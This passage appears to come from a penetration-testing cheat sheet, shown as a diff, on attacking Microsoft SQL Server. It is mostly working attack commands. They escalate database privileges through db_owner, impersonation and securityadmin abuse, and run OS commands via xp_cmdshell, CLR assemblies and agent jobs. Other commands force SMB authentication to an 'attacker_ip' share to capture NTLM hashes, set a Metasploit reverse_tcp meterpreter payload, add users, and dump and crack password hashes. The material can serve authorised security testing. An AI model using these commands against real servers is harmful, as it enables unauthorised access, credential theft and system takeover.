+	1433/tcp open  ms-sql-s
+	| ms-sql-config: 
+	|   [192.168.1.41:1433]
+	|       Databases
+	|         name	db_size	owner
+	|         ====	=======	=====
+	|         ReportServer	     11.94 MB	WIN-F820SQBBVJR\Pentester
+	|         ReportServerTempDB	      5.13 MB	WIN-F820SQBBVJR\Pentester
+	|       Configuration
+	|         name	value	inuse	description
+	|         ====	=====	=====	===========
+	|         Database Mail XPs	0	0	Enable or disable Database Mail XPs
+	|         SMO and DMO XPs	1	1	Enable or disable SMO and DMO XPs
+	|         Ole Automation Procedures	0	0	Enable or disable Ole Automation Procedures
+	|         xp_cmdshell	0	0	Enable or disable command shell
+	|         Ad Hoc Distributed Queries	0	0	Enable or disable Ad Hoc Distributed Queries
+	|         Replication XPs	0	0	Enable or disable Replication XPs
+	|_        contained database authentication	0	0	Enables contained databases and contained authentication
+
+
+Automatic check with NMAP - ‘ms-sql-tables’ module (https://nmap.org) 
+----------------------------------------------------------------------------------------
+• Queries Microsoft SQL Server (ms-sql) for a list of tables per database.
+
+  pentester@LinuxVM > nmap -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.password=Test1234 192.168.1.41
+
+	Nmap scan report for 192.168.1.41
+	Host is up (0.024s latency).
+	PORT     STATE SERVICE
+	1433/tcp open  ms-sql-s
+	| ms-sql-tables: 
+	|   [192.168.1.41:1433]
+	|       ReportServer
+	|         table	column	type	length
+	|         =====	======	====	======
+	|         History	HistoryID	uniqueidentifier	16
+	|         History	ReportID	uniqueidentifier	16
+	|         History	SnapshotDataID	uniqueidentifier	16
+	|         History	SnapshotDate	datetime	8
+	|         Keys	Client	int	4
+	|         Keys	InstallationID	uniqueidentifier	16
+	|         Keys	InstanceName	nvarchar	64
+	|         Keys	InstanceName	sysname	64
+	|         Keys	MachineName	nvarchar	512
+	|         Keys	MachineName	sysname	512
+	|         Keys	PublicKey	image	16
+	|         Keys	SymmetricKey	image	16
+	|       ReportServerTempDB
+	|         table	column	type	length
+	|         =====	======	====	======
+	|         SessionData	AutoRefreshSeconds	int	4
+	|         SessionData	AwaitingFirstExecution	bit	1
+	<SNIP>		  
+		  
+
+		  
+Automatic check with PowerUP SQL - 'Invoke-SQLDumpInfo' module (https://github.com/NetSPI/PowerUpSQL)
+----------------------------------------------------------------------------------------	  
+• This can be used to dump SQL Server and database information to csv or xml files. This can be handy for doing a quick inventory of databases, logins, privileges etc.	
+
+  PS C:\> Invoke-SQLDumpInfo -Verbose -Instance WIN-F820SQBBVJR -Username batchsvc -Password Welcome1
+
+
+Automatic check with PowerUP SQL - 'Invoke-SQLAudit' module (https://github.com/NetSPI/PowerUpSQL)
+----------------------------------------------------------------------------------------	  
+• This can be used to review the SQL Server and databases for common configuration weaknesses and provide a vulnerability report along with recommendations for each item.
+
+  PS C:\> Invoke-SQLAudit -Verbose -Instance WIN-F820SQBBVJR -Username sa -Password Test1234
+
+
+
+7.2. DB Privesc - Check for accounts which has the 'DB_OWNER' role on a 'TRUSTWORTHY' database owned by a sysadmin user
+=======================================================================================================================================
+• The DB_OWNER role can impersonate the actual database owner i.e. sysadmin user.
+  The permission 'EXECUTE AS OWNER' can be used to execute a stored procedure as another login.
+
+* Manual checks
+----------------
+-- List the owner of each database
+	SQL> SELECT name, suser_sname(owner_sid) FROM sys.databases; 		
+-- List the sysadmin user	
+	SQL> SELECT name FROM master..syslogins WHERE sysadmin = 1;								
+	SQL> SELECT l.name, l.dbname DBNAME, CASE l.sysadmin WHEN 1 then 'True' ELSE 'False' END SYSADMIN, l.denylogin, l.isntname, l.isntgroup, l.isntuser FROM master.dbo.syslogins AS l WHERE l.sysadmin = 1 OR l.securityadmin = 1; 
+-- Test membership in db_owner and print appropriate message.
+	SQL> IF IS_MEMBER ('db_owner') = 1 PRINT 'Current user is a member of the db_owner role' ELSE IF IS_MEMBER ('db_owner') = 0 PRINT 'Current user is NOT a member of the db_owner role'
+	ELSE IF IS_MEMBER ('db_owner') IS NULL PRINT 'ERROR: Invalid group / role specified'
+--	Display which Database is 'trustworthy'
+	SQL> SELECT a.name,b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name=b.name;
+	
+	
+* Manual attack
+----------------
+Scenario: The 'patrolsvc' account is a member of the db_owner role of the 'ReportServer' database which is owned by the sysadmin account 'pentester' 
+
+	SQL> Use ReportServer
+	SQL> GO
+	SQL> CREATE PROCEDURE sp_dbprivesc WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'patrolsvc','securityadmin'
+	SQL> GO
+	SQL> exec sp_dbprivesc;
+	SQL> GO	
+	SQL> SELECT name FROM master..syslogins WHERE securityadmin = 1;	
+	SQL> GO
+	-- Clean-up
+	SQL> DROP PROCEDURE sp_dbprivesc;
+	SQL> EXEC sp_dropsrvrolemember 'patrolsvc','securityadmin'
+	
+
+* Automatic check and attack with METASPLOIT - 'mssql_escalate_dbowner' module
+-----------------------------------------------------------------------------------
+Microsoft SQL Server Escalate Db_Owner: This module can be used to escalate privileges to sysadmin if the user has the db_owner role in a trustworthy database owned by a sysadmin user. 
+Once the user has the sysadmin role the msssql_payload module can be used to obtain a shell on the system.
+
+pentester@LinuxVM > msfconsole
+	msf > use auxiliary/admin/mssql/mssql_escalate_dbowner
+	msf auxiliary(ssql_escalate_dbowner) > show options
+	
+
+* Automatic check and attack with PowerUP SQL - 'Invoke-SQLAuditRoleDbOwner' module
+-------------------------------------------------------------------------------------------	
+Check if the current login has the DB_OWNER role in any databases. Attempt to use permission to obtain sysadmin privileges.	
+
+PS C:\> Invoke-SQLAuditRoleDbOwner	
+
+
+
+07.3. DB Privesc - Check for accounts wich can use the privilege 'EXECUTE AS' (Extending Database Impersonation by Using)
+=======================================================================================================================================
+• SQL Server supports the ability to impersonate another principal either explicitly by using the stand-alone EXECUTE AS statement, or implicitly by using the EXECUTE AS clause on modules.
+  > The stand-alone EXECUTE AS statement can be used to impersonate server-level principals, or logins, by using the EXECUTE AS LOGIN statement.
+  > The stand-alone EXECUTE AS statement can also be used to impersonate database level principals, or users, by using the EXECUTE AS USER statement.
+
+• Note: Server or database principals other than sa or dbo can call EXECUTE AS. The user that calls the EXECUTE AS statement must have IMPERSONATE permissions on the target principal. 
+
+* Manual checks -- Find users that can be impersonated
+-------------------------------------------------------
+C:\> SQLCMD -U our_db_account -s Server\instance
+     SQL> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+
+
+* Manual attack 
+-------------------
+Scenario: The 'batchsvc' account has the privilege to IMPERSONATE the db account 'WIN-F820SQBBVJR\pentester' 
+
+C:\> SQLCMD -U batchsvc -s WIN-F820SQBBVJR
+	SQL> SELECT SYSTEM_USER;
+		> batchsvc
+	SQL> EXECUTE AS LOGIN = 'WIN-F820SQBBVJR\pentester';
+	SQL> SELECT SYSTEM_USER;
+		> WIN-F820SQBBVJR\pentester
+	SQL> SELECT  * FROM  fn_my_permissions(NULL, 'DATABASE'); 
+	SQL> REVERT; 
+
+
+* Automatic check and attack with METASPLOIT - 'mssql_escalate_execute_as' module
+---------------------------------------------------------------------------------------
+• Microsoft SQL Server Escalate EXECUTE AS: This module can be used escalate privileges if the IMPERSONATION privilege has been assigned to the user. 
+  In most cases, this results in additional data access, but in some cases it can be used to gain sysadmin privileges.
+
+  pentester@LinuxVM > msfconsole
+	msf > use auxiliary/admin/mssql/mssql_escalate_execute_as
+	msf auxiliary(mssql_escalate_execute_as) > show options
+
+	
+
+* Automatic check and attack with PowerUP SQL - 'Invoke-SQLAuditPrivImpersonateLogin' module
+-----------------------------------------------------------------------------------------------------------
+• Check if the current login has the IMPERSONATE permission on any sysadmin logins. Attempt to use permission to obtain sysadmin privileges.
+  PS C:\> Invoke-SQLAuditPrivImpersonateLogin -Verbose -Instance WIN-F820SQBBVJR -Username batchsvc -Password Welcome1 - Exploit
+
+  OR
+
+  PS C:\> Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance 10.2.9.101 -SqlUser myuser1 -SqlPass MyPassword!
+  Link: https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1.
+
+
+
+07.4. DB Privesc - Check for accounts which are members of the group "securityadmin"
+====================================================================================================
+• Members of the securityadmin fixed server role manage logins and their properties. 
+  They can GRANT, DENY, and REVOKE server-level permissions. They can also GRANT, DENY, and REVOKE database-level permissions if they have access to a database.
+  Additionally, they can reset passwords for SQL Server logins.
+  The ability to grant access to the Database Engine and to configure user permissions allows the security admin to assign most server permissions.
+  The securityadmin role should be treated as equivalent to the sysadmin role.
+
+Abuse case/Scenario:
+-------------------
+1. Create a new user
+2. Grant the new user 'CONTROL SERVER' permission at the instance level
+3. Log in as the new user
+4. You are now 'dba'
+
+* Manual check
+---------------
+SQL> SELECT name FROM master..syslogins WHERE securityadmin = 1;
+
+
+* Manual attack 
+----------------
+scenario: the account 'WIN-F820SQBBVJR\pentester' is member of the 'securityadmin' group
+
+C:\> SQLCMD -U patrolsvc -s WIN-F820SQBBVJR
+C:\> EXECUTE AS LOGIN = 'WIN-F820SQBBVJR\monitoring';
+	SQL> USE master
+	SQL> GO
+	SQL> CREATE LOGIN PrivescUser WITH PASSWORD=N'Welcome1', DEFAULT_DATABASE=[master], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF;
+	SQL> GO
+	SQL> GRANT CONTROL SERVER TO PrivescUser;
+	SQL> GO
+	-- Login as PrivescUser with sqlcmd or dbvis
+	SQL> SELECT * FROM  fn_my_permissions(NULL, 'DATABASE'); 
+	SQL> SELECT name FROM master..syslogins WHERE sysadmin = 1;	
+	SQL> DROP LOGIN PrivescUser;
+
+	
+	
+07.5. DB privesc - Check for accounts with the  "ALTER ANY SERVER ROLE" permission
+====================================================================================================
+• To add a member to a user-defined server role, you must be a member of the sysadmin fixed server role (or have CONTROL SERVER) OR you must have the ALTER ANY SERVER ROLE permission
+  Or you must have ALTER permission on that role.
+
+• Note: The CONTROL SERVER and ALTER ANY SERVER ROLE permissions are not sufficient to execute ALTER SERVER ROLE for a fixed server role, and ALTER permission cannot be granted on a fixed server role (e.g. sysadmin, securityadmin).
+
+
+* Manual checks
+----------------
+	SQL> SELECT * FROM  fn_my_permissions(NULL, 'DATABASE');
+	SQL> SELECT pr.name, pe.state_desc, pe.permission_name FROM sys.server_principals AS pr JOIN sys.server_permissions AS pe ON pe.grantee_principal_id = pr.principal_id WHERE pr.type = 'R' ORDER BY name
+
+* Manual attack
+----------------
+Scenario: we add our db account into a high privileged role...privesc
+
+	SQL> ALTER SERVER ROLE CustomSysDbaRole ADD MEMBER "WIN-F820SQBBVJR\HR-app";
+	SQL> SELECT * FROM  fn_my_permissions(NULL, 'DATABASE');
+
+
+
+07.6. DB Privesc - Check for accounts with "LINKED SERVERS" (MS SQL Server database links)
+=================================================================================================================
+
+* Manual checks
+----------------
+	SQL> SELECT * from sysoledbusers;			//Contains one row for each user and password mapping for the specified linked server
+
+* Manual attack
+----------------
+	SQL> SELECT * FROM [LinkedServer].[Database].[Schema].[ObjectName];
+	SQL> SELECT * FROM [SQLSRVPROD01\INTANCE01].Database_name.Schema_name.Table_name;
+
+
+* Automatic checks and attacks with METASPLOIT - 'mssql_linkcrawler' module
+----------------------------------------------------------------------------------
+• Microsoft SQL Server Database Link Crawling Command Execution.
+  This module can be used to crawl MS SQL Server database links and deploy Metasploit payloads through links configured with sysadmin privileges using a valid SQL Server Login. 
+  If you are attempting to obtain multiple reverse shells using this module we recommend setting the "DisablePayloadHandler" advanced option to "true", and setting up a exploit/multi/handler to run in the background as a job to support multiple incoming shells. 
+  If you are interested in deploying payloads to specific servers this module also supports that functionality via the "DEPLOYLIST" option. Currently, the module is capable of delivering payloads to both 32bit and 64bit Windows systems via powershell memory injection methods based on Matthew Graeber's work. 
+  As a result, the target server must have powershell installed. By default, all of the crawl information is saved to a CSV formatted log file and MSF loot so that the tool can also be used for auditing without deploying payloads.
+
+  pentester@LinuxVM > msfconsole
+	msf > use exploit/windows/mssql/mssql_linkcrawler
+	msf auxiliary(mssql_linkcrawler) > show options
+	
+
+* Automatic checks and attacks with PowerUp SQL - 'Get-SQLServerLink' module
+----------------------------------------------------------------------------------
+• Get a list of SQL Server Link on the server.
+
+  PS C:\Users\Pen003\Documents\Tools\PowerUPsql-master> Get-SQLServerLink -U sa -P Test1234 -Instance WIN-F820SQBBVJR;
+	ComputerName           : WIN-F820SQBBVJR
+	Instance               : WIN-F820SQBBVJR
+	DatabaseLinkId         : 1
+	DatabaseLinkName       : SQLSRVPROD1\INSTANCE01
+	DatabaseLinkLocation   : Remote
+	Product                :
+	Provider               : SQLNCLI
+	Catalog                :
+	LocalLogin             :
+	RemoteLoginName        : SA
+	is_rpc_out_enabled     : False
+	is_data_access_enabled : True
+	modify_date            : 16/10/2017 15:21:24
+
+	ComputerName           : WIN-F820SQBBVJR
+	Instance               : WIN-F820SQBBVJR
+	DatabaseLinkId         : 1
+	DatabaseLinkName       : SQLSRVPROD1\INSTANCE01
+	DatabaseLinkLocation   : Remote
+	Product                :
+	Provider               : SQLNCLI
+	Catalog                :
+	LocalLogin             : Uses Self Credentials
+	RemoteLoginName        :
+	is_rpc_out_enabled     : False
+	is_data_access_enabled : True
+	modify_date            : 16/10/2017 15:21:24
+
+	<SNIP>
+
+
+• Get-SQLServerLinkCrawl Crawls linked servers and supports SQL query and OS command execution.
+  Examples:
+  PS C:\> Get-SQLServerLinkCrawl -Verbose -Instance "10.1.1.1\SQLSERVER2008“
+  PS C:\> Get-SQLServerLinkCrawl -Verbose -Instance "10.1.1.1\SQLSERVER2008" -Query “select * from master..sysdatabases”
+  PS C:\> Get-SQLServerLinkCrawl -Verbose -Instance "10.1.1.1\SQLSERVER2008" -Query “exec master..xp_cmdshell ‘whoami’”	
+	
+
+	
+07.7. OS Privesc - From SYSDBA to a low (or high) privileged OS user using the extended stored procedure "XP_CMDSHELL"
+=======================================================================================================================================
+• Run unathorized remote OS commands as the SQL Server service account using the extended stored procedure xp_cmdshell.
+
+* Manual checks
+----------------
+	SQL> SELECT name FROM master..syslogins WHERE sysadmin = 1;
+	SQL> SELECT * FROM  fn_my_permissions(NULL, 'DATABASE'); 
+
+	
+* Manual attack
+----------------
+	SQL> EXEC sp_configure ‘show advanced options’, 1;  	-- To allow advanced options to be changed.
+	SQL> RECONFIGURE;					-- To update the currently configured value for advanced options.
+	SQL> EXEC sp_configure ‘xp_cmdshell’, 1;		-- To enable the feature.
+	SQL> RECONFIGURE;					-- To update the currently configured value for this feature.
+	SQL> EXEC xp_cmdshell ‘ipconfig’; 
+
+* Manual cleaning
+------------------
+	EXECUTE sp_configure 'show advanced options', 1;
+	RECONFIGURE;
+	EXECUTE sp_configure 'Xp_cmdshell', 0;
+	RECONFIGURE; 
+	GO EXECUTE sp_configure 'show advanced options', 0;
+	RECONFIGURE;
+	
+* Automatic checks and attacks with NMAP - ‘ms-sql-xp-cmdshell’ module
+-----------------------------------------------------------------------------
+• This module attempts to run a command using the command shell stored procedure of Microsoft SQL Server (ms-sql).
+
+  pentester@LinuxVM > nmap -p 445 --script ms-sql-discover,ms-sql-empty-password,ms-sql-xp-cmdshell <host>
+  pentester@LinuxVM > nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net user test test /add" <host>
+	
+	
+* Automatic checks and attacks with METASPLOIT - 'mssql_exec' module (Microsoft SQL Server xp_cmdshell Command Execution)
+------------------------------------------------------------------------------------------------------------------------------
+• This module will execute a Windows command on a MSSQL/MSDE instance via the xp_cmdshell procedure. A valid username and password is required to use this module
+
+  pentester@LinuxVM > msfconsole
+  msf > use auxiliary/admin/mssql/mssql_exec
+      msf auxiliary(mssql_exec) > show actions
+            ...actions...
+      msf auxiliary(mssql_exec) > set ACTION <action-name>
+      msf auxiliary(mssql_exec) > show options
+            ...show and set options...
+      msf auxiliary(mssql_exec) > run	
+	
+	
+* Automatic checks and attacks with METASPLOIT - 'mssql_payload' module (Microsoft SQL Server Payload Execution)
+----------------------------------------------------------------------------------------------------------------
+• This module executes an arbitrary payload on a Microsoft SQL Server by using the "xp_cmdshell" stored procedure. Currently, three delivery methods are supported. 
+  > First, the original method uses Windows 'debug.com'. File size restrictions are avoided by incorporating the debug bypass method presented by SecureStat at Defcon 17.
+    Since this method invokes ntvdm, it is not available on x64 systems. 
+  > A second method takes advantage of the Command Stager subsystem.
+    This allows using various techniques, such as using a TFTP server, to send the executable.
+    By default the Command Stager uses 'wcsript.exe' to generate the executable on the target. 
+  > Finally, ReL1K's latest method utilizes PowerShell to transmit and recreate the payload on the target.
+    NOTE: This module will leave a payload executable on the target system when the attack is finished.
+
+  pentester@LinuxVM > msfconsole
+      msf > use exploit/windows/mssql/mssql_payload
+      msf exploit(mssql_payload) > show targets
+            ...targets...
+      msf exploit(mssql_payload) > set TARGET <target-id>
+      msf exploit(mssql_payload) > show options
+            ...show and set options...
+      msf exploit(mssql_payload) > exploit
+    
+
+
+* Automatic checks and attacks with PowerUp SQL - 'Invoke-SQLOSCmd' module
+----------------------------------------------------------------------------------	
+• Execute OS commands: xp_cmdshell	
+  PS C:\> $Targets | Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10	
+
+
+
+07.8. OS Privesc - From SYSDBA to a low (or high) privileged OS user using a custom CLR (Assembly) stored procedure execution
+============================================================================================================================
+• If your SQL Server login is not a sysadmin, but has the CREATE or ALTER ASSEMBLY permission, you may be able to obtain
+  sysadmin privileges using a custom CLR that executes OS commands under the context of the SQL Server service account (which is a sysadmin by default). 
+  However, for that to be successful, the database you create the CLR assembly in, must have the 'is_trustworthy' flag set to '1' and the 'clr enabled' server setting turned on.
+  By default, only the msdb database is trustworthy, and the 'clr enabled' setting is disabled. 
+
+
+* Automatic checks and attacks with METASPLOIT - 'mssql_clr_payload' module (Microsoft SQL Server Clr Stored Procedure Payload Execution)
+------------------------------------------------------------------------------------------------------------------------------------------ 
+• This module executes an arbitrary native payload on a Microsoft SQL server by loading a custom SQL CLR Assembly into the target SQL installation, and calling it directly with
+  a base64-encoded payload. 
+  The module requires working credentials in order to connect directly to the MSSQL Server. This method requires the user to have sufficient privileges to install a custom SQL CRL DLL,
+  and invoke the custom stored procedure that comes with it. This exploit does not leave any binaries on disk. Tested on MS SQL Server versions: 2005, 2012, 2016 (all x64).
+
+  pentester@LinuxVM > msfconsole
+	msf > use exploit/windows/mssql/mssql_clr_payload
+	msf auxiliary(mssql_clr_payload) > show advances options
+	msf auxiliary(mssql_clr_payload) > SET DATABASE msdb
+	msf auxiliary(mssql_clr_payload) > SET RHOST 192.168.1.38 
+	msf auxiliary(mssql_clr_payload) > SET PASSWORD Test1234
+	msf auxiliary(mssql_clr_payload) > SET payload /windows/x64/meterpreter/reverse_tcp
+	msf auxiliary(mssql_clr_payload) > exploit
+	
+	> getuid
+	> sysinfo
+	> ipconfig
+	> execute -f cmd.exe -H -i
+
+	
+* Automatic checks and attacks with PowerUP SQL - 'Invoke-SQLOSCLR' module
+--------------------------------------------------------------------------- 	
+PS C:\> $Targets | Invoke-SQLOSCLR -Verbose -Command "Whoami"
+
+
+	
+07.9. OS Privesc - From SYSDBA to low/high privileged OS user by using 'Ole Automation Procedures', 'External Scripting', an Agent Job, a custom stored procedure
+===============================================================================================================================================================
+
+* Automatic checks and attacks with PowerUp SQL
+==================================================
+
+Execute OS commands: Custom xp
+--------------------------------
+PS C:\> Create-SQLFileXpDll -OutFile c:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test -Verbose 
+Host the test.dll on a share readable by the SQL Server service account. 
+PS C:\> Get-SQLQuery -Verbose -Query "sp_addextendedproc 'xp_test', '\\yourserver\yourshare\myxp.dll'"xp_test" 
+PS C:\> sp_dropextendedproc 'xp_test'
+
+	USE master;  
+	GO  
+	EXEC sp_addextendedproc xp_hello, 'c:\xp_hello.dll';  
+
+
+Execute OS commands using Ole Automation Procedures	
+----------------------------------------------------
+PS C:\> $Targets | Invoke-SQLOSOle -Verbose -Command "Whoami"
+
+
+Execute OS commands using 'External Scripting'
+---------------------------------------------
+• R	
+PS C:\> $Targets | Invoke-SQLOSR -Verbose -Command "Whoami"
+• Python	
+PS C:\> $Targets | Invoke-SQLOSPython -Verbose -Command "Whoami"
+
+Execute OS commands with an Agent Job
+--------------------------------------
+• CmdExec	
+PS C:\> $Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command "echo hello > c:\windows\temp\test1.txt"
+
+• PowerShell	
+PS C:\> $Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output "hello world" | out-file c:\windows\temp\test2.txt' -Sleep 20
+
+• VBScript	
+PS C:\> $Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\test3.txt'
+
+• JScript	
+PS C:\> $Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\test3.txt'
+
+
+
+	
+07.10. OS & DB Privesc - Capture SMB authentication (NTLM credentials) using the native "xp_dirtree" or "xp_fileexist" stored procedure
+=====================================================================================================================================
+
+* Manual attack
+----------------
+
+Step 1 - Log into the MS SQL database
+Step 2 - Use xp_dirtree or xp_fileexist stored procedure to force the database to perform a SMB connection to an arbitray share.
+
+	Ex 1- xp_dirtree stored procedure
+	----------------------------------
+	SQL> EXEC master.sys.xp_dirtree 'C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Log\',0,1;		--list the files of a directory
+	SQL> EXEC master.sys.xp_dirtree  '\\attacker_ip\file'
+
+	Ex 2- xp_fileexist stored procedure
+	----------------------------------
+	SQL> SET NOCOUNT ON DECLARE @FileName varchar(255) SELECT @FileName='C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Log\SQLAGENT.OUT'
+	SQL> EXEC Master.dbo.xp_fileexist @filename
+	SQL> GO
+	SQL> SET NOCOUNT ON DECLARE @FileName varchar(255) SELECT @FileName='\\attacker_ip\file'
+	SQL> EXEC Master.dbo.xp_fileexist @filename
+	SQL> GO
+
+Step 3 - Use tool "METASPLOIT" or "RESPONDER" to start a SMB rogue authentication server that will be able to capture the NETLM hashes.
+	
+	
+	
+* Automatic checks and attacks with METASPLOIT - 'mssql_ntlm_stealer' module (Microsoft SQL Server NTLM Stealer)
+------------------------------------------------------------------------------------------------------------------
+• This module can be used to help capture or relay the LM/NTLM credentials of the account running the remote SQL Server service. 
+  The module will use the supplied credentials to connect to the target SQL Server instance and execute the native "xp_dirtree" or "xp_fileexist" stored procedure.
+  The stored procedures will then force the service account to authenticate to the system defined in the SMBProxy option.
+  In order for the attack to be successful, the SMB capture or relay module must be running on the system defined as the SMBProxy. 
+  The database account used to connect to the database should only require the "PUBLIC" role to execute. 
+  Successful execution of this attack usually results in local administrative access to the Windows system. 
+  Specifically, this works great for relaying credentials between two SQL Servers using a shared service account to get shells.
+  However, if the relay fails, then the LM hash can be reversed using the Halflm rainbow tables and john the ripper. 
+
+  pentester@LinuxVM > msfconsole
+	msf > use auxiliary/admin/mssql/mssql_ntlm_stealer
+	msf auxiliary(mssql_ntlm_stealer) > show advanced options
+
+	
+	
+
+07.11. OS Privesc - Read files stored on the Windows server hosting the database using the "BULKADMIN" role and "INSERT" privilege
+=====================================================================================================================================
+
+* Manual checks
+----------------
+	SQL> SELECT name FROM master..syslogins WHERE bulkadmin = 1;		//Who has a particular priv bulkadmin
+
+
+* Manual attack - Read an os file (e.g. ERRORLOG.1) using the "bulk insert" command (it requires the "BULKADMIN" role  and "INSERT" privilege)
+-----------------------------------------------------------------------------------------------------------------------------------------------
+	SQL> create table TempReadTable (line varchar(256));
+	SQL> bulk insert TempReadTable from 'C:\Program Files (x86)\Microsoft SQL Server\110\License Terms\License_SqlPolicies.txt';
+	SQL> select * from TempReadTable;
+	SQL> drop table	TempReadTable;
+
+
+
+============================================================================================================
+08. How to dump and crack MSSQL password hashes
+============================================================================================================
+
+1. Manual MSSQL (SQL) Password hashes dump
+===========================================
+SQL> SELECT name, password, LOGINPROPERTY(name, 'PasswordHash' ) hash FROM syslogins WHERE password IS NOT NULL; 	-- Test on SQL Server 2012
+SQL> SELECT name from sys.sql_logins union all select master.dbo.fn_varbintohexstr(password_hash)from sys.sql_logins
+
+
+2. MSSQL (SQL) Password hashes cracking using John The Ripper
+==============================================================
+• Password dictionary attack
+  pentester@LinuxVM > john --wordlist=dico.txt --rules --session=1 --format=mssql12 file_with_hashes.txt
+  pentester@LinuxVM > john --show file_with_hashes.txt
+  
+• Password bruteforce attack
+  pentester@LinuxVM > john --session=2 --format=mssql12 file_with_hashes.txt	
+  pentester@LinuxVM > john --show file_with_hashes.txt
+
+
+3. Automatic MSSQL (SQL) Password hashes dump and cracking
+============================================================
+
+METASPLOIT - 'mssql_hashdump' module (MSSQL Password Hashdump)
+--------------------------------------------------------------------
+• This module extracts the usernames and encrypted password hashes from a MSSQL server and stores them for later cracking. 
+• This module also saves information about the server version and table names, which can be used to seed the wordlist.
+
+  pentester@LinuxVM > msfconsole
+	msf > auxiliary/scanner/mssql/mssql_hashdump
+	msf auxiliary(mmssql_hashdump) > show options	
+
+	
+METASPLOIT - 'jtr_mssql_fast' module (John the Ripper MS SQL Password Cracker - Fast Mode)
+-------------------------------------------------------------------------------------------
+• This module uses John the Ripper to identify weak passwords that have been acquired from the mssql_hashdump module. 
+  Passwords that have been successfully cracked are then saved as proper credentials	
+	
+  pentester@LinuxVM > msfconsole	
+      msf > use auxiliary/analyze/jtr_mssql_fast
+      msf auxiliary(jtr_mssql_fast) > show actions
+            ...actions...
+      msf auxiliary(jtr_mssql_fast) > set ACTION <action-name>
+      msf auxiliary(jtr_mssql_fast) > show options
+            ...show and set options...
+      msf auxiliary(jtr_mssql_fast) > run
